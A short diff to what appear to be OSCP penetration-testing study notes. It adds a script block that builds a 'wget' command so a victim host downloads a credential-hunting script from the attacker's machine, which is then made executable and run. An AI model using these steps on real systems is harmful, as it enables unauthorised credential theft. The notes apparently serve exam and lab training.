@@ -6,10 +6,16 @@ on KALI ATTACKER
 ```
 cd ~/Desktop/Tools/Credential-Hunting && python -m http.server 80
 ```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
+const command = `wget http://${KaliIP}:80/credshunter.sh`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 on VICTIM HOST
 ```
-chmod +x credshunter.sh
+chmod +x credshunter.sh 
 ```
 
 Execute
